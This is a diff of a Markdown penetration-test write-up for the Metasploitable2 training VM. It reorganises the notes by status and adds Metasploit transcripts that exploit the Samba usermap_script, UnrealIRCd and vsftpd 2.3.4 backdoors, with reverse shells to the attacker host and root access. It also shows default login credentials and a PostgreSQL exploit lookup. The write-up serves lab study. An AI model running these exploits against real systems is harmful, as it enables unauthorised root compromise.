@@ -7,15 +7,16 @@ title: 'Metasploitable2'
 	- [nikto](#nikto)
 	- [gobuster](#gobuster)
 	- [nessus](#nessus)
-- [exploit](#exploit)
+- [exploit in progress](#exploit-in-progress)
 	- [php → not done](#php-→-not-done)
-	- [vnc → to root](#vnc-→-to-root)
-	- [ftp → in?](#ftp-→-in?)
-	- [bind shell backdoor → to root](#bind-shell-backdoor-→-to-root)
-	- [telnet → to machine → privesc?](#telnet-→-to-machine-→-privesc?)
-	- [samba → to root (msf)](#samba-→-to-root-(msf))
-	- [UnrealIRCD → to root (msf)](#unrealircd-→-to-root-(msf))
-	- [postgresql → not done](#postgresql-→-not-done)
+	- [telnet](#telnet)
+	- [postgresql](#postgresql)
+- [exploited](#exploited)
+	- [vnc (remmina)](#vnc-(remmina))
+	- [bind shell backdoor (nc)](#bind-shell-backdoor-(nc))
+	- [samba (msf)](#samba-(msf))
+	- [UnrealIRCD (msf)](#unrealircd-(msf))
+	- [ftp (msf)](#ftp-(msf))
 
 ## recon
 
@@ -222,7 +223,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 ![img/img1.png](img/img1.png)
 
-## exploit
+## exploit in progress
 
 ### php → not done
 
@@ -302,7 +303,39 @@ Registered Stream Filters 	string.rot13, string.toupper, string.tolower, string.
 [...]
 ```
 
-### vnc → to root
+### telnet
+
+```bash
+$ telnet 192.168.187.129
+Trying 192.168.187.129...
+Connected to 192.168.187.129.
+Escape character is '^]'.
+                _                  _       _ _        _     _      ____  
+ _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
+| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
+| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
+|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
+                            |_|                                          
+
+Warning: Never expose this VM to an untrusted network!
+
+Contact: msfdev[at]metasploit.com
+
+Login with msfadmin/msfadmin to get started
+
+metasploitable login:
+```
+
+### postgresql
+
+```
+$ searchsploit PostgreSQL 
+PostgreSQL 8.2/8.3/8.4 - UDF for Command Execution                                                  | linux/local/7855.txt
+```
+
+## exploited
+
+### vnc (remmina)
 
 ![img/img2.png](img/img2.png)
 
@@ -310,27 +343,7 @@ Use Remmina:
 
 ![img/img3.png](img/img3.png)
 
-### ftp → in?
-
-```bash
-$ ftp 192.168.187.129
-Connected to 192.168.187.129.
-220 (vsFTPd 2.3.4)
-Name (192.168.187.129:kali): anonymous
-331 Please specify the password.
-Password:
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp> ls -la
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
-drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
-drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
-226 Directory send OK.
-```
-
-### bind shell backdoor → to root
+### bind shell backdoor (nc)
 
 ![img/img4.png](img/img4.png)
 
@@ -388,30 +401,7 @@ root@metasploitable:/# root@metasploitable:/# bash: Upgrade-Insecure-Requests:: 
 root@metasploitable:/# root@metasploitable:/# root@metasploitable:/# root@metasploitable:/#
 ```
 
-### telnet → to machine → privesc?
-
-```bash
-$ telnet 192.168.187.129
-Trying 192.168.187.129...
-Connected to 192.168.187.129.
-Escape character is '^]'.
-                _                  _       _ _        _     _      ____  
- _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
-| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
-| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
-|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
-                            |_|                                          
-
-Warning: Never expose this VM to an untrusted network!
-
-Contact: msfdev[at]metasploit.com
-
-Login with msfadmin/msfadmin to get started
-
-metasploitable login:
-```
-
-### samba → to root (msf)
+### samba (msf)
 
 ```bash
 kali@kali:~$ searchsploit samba
@@ -421,7 +411,6 @@ msf5 > search "samba"
 13  exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba "username map script" Command Execution
 msf5 > use 13
 msf5 exploit(multi/samba/usermap_script) > set rhosts 192.168.187.129
-rhosts => 192.168.187.129
 msf5 exploit(multi/samba/usermap_script) > run
 [*] Started reverse TCP handler on 192.168.187.128:4444 
 [*] Command shell session 1 opened (192.168.187.128:4444 -> 192.168.187.129:49244) at 2020-07-10 06:12:09 -0400
@@ -429,21 +418,18 @@ whoami
 root
 ```
 
-### UnrealIRCD → to root (msf)
+### UnrealIRCD (msf)
 
 ```bash
 msf5 > search UnrealIRCd
 0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution
 msf5 > use 0
 msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set rhosts 192.168.187.129
-rhosts => 192.168.187.129
 msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > run
 [-] 192.168.187.129:6667 - Exploit failed: An exploitation error occurred.
 [*] Exploit completed, but no session was created.
 msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse_perl
-payload => cmd/unix/reverse_perl
 msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set lhost 192.168.187.128
-lhost => 192.168.187.128
 msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > run
 
 [*] Started reverse TCP handler on 192.168.187.128:4444 
@@ -457,11 +443,37 @@ whoami
 root
 ```
 
-guide (not yet done): [https://www.hackingtutorials.org/metasploit-tutorials/hacking-unreal-ircd-3-2-8-1/](https://www.hackingtutorials.org/metasploit-tutorials/hacking-unreal-ircd-3-2-8-1/)
+### ftp (msf)
 
-### postgresql → not done
+```bash
+$ ftp 192.168.187.129
+Connected to 192.168.187.129.
+220 (vsFTPd 2.3.4)
+Name (192.168.187.129:kali): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
+drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
+226 Directory send OK.
 
-```
-$ searchsploit PostgreSQL 
-PostgreSQL 8.2/8.3/8.4 - UDF for Command Execution                                                  | linux/local/7855.txt
+msf5 > search vsftpd
+ 0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+msf5 > use 0
+[*] No payload configured, defaulting to cmd/unix/interact
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 192.168.187.129
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run
+[*] 192.168.187.129:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.168.187.129:21 - USER: 331 Please specify the password.
+[+] 192.168.187.129:21 - Backdoor service has been spawned, handling...
+[+] 192.168.187.129:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (0.0.0.0:0 -> 192.168.187.129:6200) at 2020-07-13 03:32:15 -0400
+whoami
+root
 ```
